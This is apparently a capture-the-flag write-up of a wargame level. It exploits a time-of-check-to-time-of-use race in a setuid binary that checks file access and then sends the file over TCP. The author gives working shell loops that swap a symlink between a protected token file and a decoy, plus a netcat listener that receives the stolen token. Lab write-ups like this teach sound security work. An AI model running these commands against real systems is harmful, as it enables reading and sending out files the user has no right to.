in level 10 we are again given an executible and a token file we cannot access

upon inspection we see that the executible requires two arguments namely a file and a host;
The executible sends the file via tcp to the host
We run an ltrace on the executible and realise that it calls the function 'access' to check if the file is accessible to the user(using the effective UID and GID)

This use can be exploited using the Time-Of-Check-to-Time-Of-Use (TOCTOU) bug;

The executible also listens on port 6969 for connection so we use netcat to open a port: nc -lk 6969 ... -lk flags mean keep listening after port is closed

We create an arbitary file /tmp/faketoken and send it using our exectible and see that the data is received.

We then create a loop that will link our token file with a file(tiktok) and unlink it by linking our file(tiktok) to our arbitary file(/tmp/faketoken) which we have full permissions to:
	while true; do ln -sf /home/user/level10/token tiktok; ln -sf /tmp/faketoken tiktok; done &
this will create the TOCTOU race condition which we will exploit

Now we just run our executible on our linked file on a loop and we get our token on our netcat connection we opened:
	while true; do /home/user/level10/level10 /tmp/tiktok host; done
